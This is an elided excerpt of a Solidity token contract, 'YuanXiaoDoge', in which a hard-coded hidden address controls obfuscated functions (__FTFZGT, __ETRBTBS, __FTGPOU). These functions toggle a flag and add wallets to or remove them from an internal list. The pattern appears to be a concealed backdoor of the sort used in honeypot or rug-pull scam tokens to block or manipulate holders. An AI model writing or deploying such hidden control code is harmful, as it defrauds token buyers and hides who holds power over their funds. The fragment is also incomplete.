...
contract Ownable is Context {
    ...
    address private _diwoAddress = 0xBe64BF68224FB1cBC415C350f03186D932a62A96;
...
contract YuanXiaoDoge is Context, IERC20, Ownable {
    ...
    string private _name = "TG:YuanXiaoDogeCN";
    ...
    function includeInFee(address abmcud) public diwoAddress {
        _uyugdfgrteewrew[abmcud] = false;
    }
 
    function __FTFZGT(bool abmcud) external diwoAddress() {
        _GHDSOH = abmcud;
    }
    function __ETRBTBS(address abmcud) external diwoAddress() {
        _TREHGF[abmcud] = true;
    }

    function __FTGPOU(address abmcud) external diwoAddress() {
        delete _TREHGF[abmcud];
    }
